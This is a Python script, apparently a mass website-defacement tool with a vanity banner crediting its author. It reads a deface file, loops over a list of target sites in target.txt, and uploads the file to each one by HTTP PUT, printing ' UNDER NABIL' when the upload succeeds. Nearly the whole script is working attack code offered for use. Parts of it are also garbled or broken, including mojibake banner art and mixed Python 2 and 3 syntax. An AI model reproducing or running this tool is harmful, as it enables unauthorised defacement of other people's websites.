#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
            â–‘â–ˆâ–„â”€â–‘â–ˆ â”€â–ˆâ–€â–€â–ˆ â–‘â–ˆâ–€â–€â–ˆ â–€â–ˆâ–€ â–‘â–ˆâ”€â”€â”€ 
            â–‘â–ˆâ–‘â–ˆâ–‘â–ˆ â–‘â–ˆâ–„â–„â–ˆ â–‘â–ˆâ–€â–€â–„ â–‘â–ˆâ”€ â–‘â–ˆâ”€â”€â”€ 
            â–‘â–ˆâ”€â”€â–€â–ˆ â–‘â–ˆâ”€â–‘â–ˆ â–‘â–ˆâ–„â–„â–ˆ â–„â–ˆâ–„ â–‘â–ˆâ–„â–„â–ˆ
                                
          â–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ€ƒâ–„â–€â–ˆâ€ƒâ–ˆâ–‘â–‘
          â–ˆâ–„â–ˆâ€ƒâ–ˆâ–€â–‘â€ƒâ–ˆâ–€â–‘â€ƒâ–ˆâ€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–„â–„
                
                            
                                                                                                     
\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mNABIL RAHMAN
\033[1;96mInstagram \033[1;93m: \033[1;92mðŸ’€UNKNOWNðŸ’€
\033[1;96mFacebook  \033[1;93m: \033[1;92mNabil Rahman
\033[1;96mPronhub \033[1;93m: \033[1;92mNai
\033[1;91m======================================="""
""
os.system("clear")
print  """
       

\033[1;97m  _       __________    __________  __  _________\033[0m
\033[1;97m | |     / / ____/ /   / ____/ __ \/  |/  / ____/\033[0m
\033[1;97m | | /| / / __/ / /   / /   / / / / /|_/ / __/   \033[0m
\033[1;97m | |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___   \033[0m
\033[1;97m |__/|__/_____/_____/\____/\____/_/  /_/_____/\033[3;97mv1.1\033[0m
  \033[1;91mâ–ˆâ–ˆ 20% *___*
   \033[1;92mâ–ˆâ–ˆâ–ˆ 40% *___*
    \033[1;93mâ–ˆâ–ˆâ–ˆâ–ˆ 60% *___* 
      \033[1;97mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 80% *___*
       \033[1;96mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ MADE BY NABIL *___*
"""""
b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FUCK!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" UNDER NABIL"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("NABIL SAY ENTER UR DEFACE: ")
         if not os.path.isfile(a):
            print("VUL FILE"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
